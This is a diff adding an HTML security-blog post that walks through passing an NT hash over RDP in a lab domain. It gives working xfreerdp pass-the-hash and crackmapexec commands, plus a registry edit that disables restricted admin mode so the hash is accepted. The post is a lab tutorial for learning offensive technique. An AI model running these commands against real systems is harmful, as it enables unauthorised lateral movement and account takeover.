@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passing the hash through RDP - crit's Website</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link href="../assets/css/custom.css" rel="stylesheet">
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../assets/img/favicon.png">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="../index.html">crit0x90</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active" href="index.html">> Blog</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container mt-5">
+        <div class="row">
+            <div class="col-lg-8">
+                <!-- Date -->
+                <p class="text-muted">Posted on August 29, 2023</p>
+                
+                <!-- Title -->
+                <h1 class="mt-4 mb-3">Passing the hash through RDP</h1>
+                
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <h2>Scenario</h2>
+                        <p>You've obtained local access to a machine and you have the hash for another user that has an account on a different machine, but you're not able to crack it. Maybe you don't have access via winrm or maybe you need GUI access so that you can bypass UAC. If RDP is running, you may be able to pass the hash with xfreerdp. Note that this approach requires modifying the Windows registry (typically this means the user needs to be Administrator).</p>
+                        
+                        <p>For this example, I'll be using the Kanto domain which is made up of two machines. A regular host named Pallet and a domain controller named DC01. There are two users on this domain as well; Oak who is a local admin to Pallet and Ash who is the domain admin.</p>
+                        
+                        <div class="text-center mb-4">
+                            <img src="../assets/img/passthehash/layout.jpg" alt="The Kanto domain" class="img-fluid border border-success">
+                            <p class="text-muted mt-2">The Kanto domain</p>
+                        </div>
+                        
+                        <p>For this example I've gained access to Pallet, dumped the hashes, and acquired the hash for ash.</p>
+                        
+                        <div class="text-center mb-4">
+                            <img src="../assets/img/passthehash/ashHash.png" alt="The hash for ash" class="img-fluid border border-success">
+                            <p class="text-muted mt-2">Ash's hash</p>
+                        </div>
+                        
+                        <h2>Passing the hash with xfreerdp</h2>
+                        <p>To access the remote machine with the hash, you can replace the relevant arguments and run the following command. I'm running this command through an http tunnel so I have to prepend it with "proxychains" as well.</p>
+                        
+                        <pre><code>proxychains xfreerdp /u:ash /v:192.168.150.130 /pth:7659003efbb9d6ac24d4c775cc49ae72</code></pre>
+                        
+                        <p>Initially the command appears to work, but when you gain access you'll be met with the following screen.</p>
+                        
+                        <div class="text-center mb-4">
+                            <img src="../assets/img/passthehash/blocked.png" alt="Blocked" class="img-fluid border border-success">
+                            <p class="text-muted mt-2">Blocked</p>
+                        </div>
+                        
+                        <h2>Understanding restricted admin mode</h2>
+                        <p>This message indicates that my attempt to RDP was blocked due to something called <em>restricted admin mode</em>. Restricted admin mode was initially introduced in Windows 8.1/Server 2012 R2 to try to mitigate pass-the-hash attacks by preventing RDP users' credentials from being stored in memory when they log in. This prevents users from having their creds read out of memory if the host that they're logging in to is compromised, but to implement this RDP uses network logons rather than interactive logons. This allows a malicious actor to use an NT Hash or Kerberos ticket to authenticate. Ironically, by blocking one attack vector Microsoft facilitated the problem that facilitated another. You can now pass the hash via RDP as long as you can disable restricted admin.</p>
+                        
+                        <h2>Disabling restricted admin</h2>
+                        <p>To disable restricted admin, you have several options. Plan A is to do it through winrm by modifying the registry with the following command:</p>
+                        
+                        <pre><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></pre>
+                        
+                        <p>I'll break this command down.</p>
+                        <ul class="command-breakdown">
+                            <li><code>reg add</code> - used to add a new registry key or modify an existing one</li>
+                            <li><code>HKLM\System\CurrentControlSet\Control\Lsa</code> - the path to the registry key that you want to modify. In this case, it's the lsa (local security authority)</li>
+                            <li><code>/t REG_DWORD</code> - the data type of the value that you want to set</li>
+                            <li><code>/v</code> - the name of the value that you want to set or modify. In this case, DisableRestrictedAdmin</li>
+                            <li><code>/d</code> - the data that you want to set for the value. In this case it's hex 0</li>
+                            <li><code>/f</code> - forces the operation to complete without prompting for confirmation</li>
+                        </ul>
+                        
+                        <p>This works great if you have winrm access, but what if the service is disabled or you're blocked by a firewall or...? Then you have to fall back to plan B. If you have SMB access you may be able to set the registry value via crackmapexec. You can check SMB access by running something like the command below.</p>
+                        
+                        <pre><code>proxychains crackmapexec smb 192.168.150.130 -u 'ash' -H '7659003efbb9d6ac24d4c775cc49ae72' -d kanto.local</code></pre>
+                        
+                        <div class="text-center mb-4">
+                            <img src="../assets/img/passthehash/pwned.png" alt="CME SMB" class="img-fluid border border-success">
+                            <p class="text-muted mt-2">pwn3d!</p>
+                        </div>
+                        
+                        <p>The (Pwn3d!) message indicates that I have SMB access, so I can try to run the following command to modify the registry remotely.</p>
+                        
+                        <pre><code>proxychains crackmapexec smb 192.168.150.130 -u 'ash' -H '7659003efbb9d6ac24d4c775cc49ae72' -d kanto.local -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'</code></pre>
+                        
+                        <p>The -x flag allows you to specify a command to execute. In this case, it worked and I was able to access the target machine via RDP after running it.</p>
+                        
+                        <div class="text-center mb-4">
+                            <img src="../assets/img/passthehash/done.png" alt="Done" class="img-fluid border border-success">
+                            <p class="text-muted mt-2">Success!</p>
+                        </div>
+                        
+                        <h2>TLDR;</h2>
+                        <p>You can pass the hash through RDP if you're able to modify the registry on the targeted machine.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sidebar -->
+            <div class="col-lg-4">
+                <div class="card">
+                    <div class="card-header">Tools Used</div>
+                    <div class="card-body">
+                        <ul class="list-unstyled mb-0">
+                            <li>xfreerdp</li>
+                            <li>crackmapexec</li>
+                            <li>proxychains</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="py-5 bg-dark mt-5">
+        <div class="container">
+            <p class="m-0 text-center text-white">&copy; 2025 crit0x90</p>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JS -->
+    <script src="../assets/js/custom.js"></script>
+</body>
+</html>
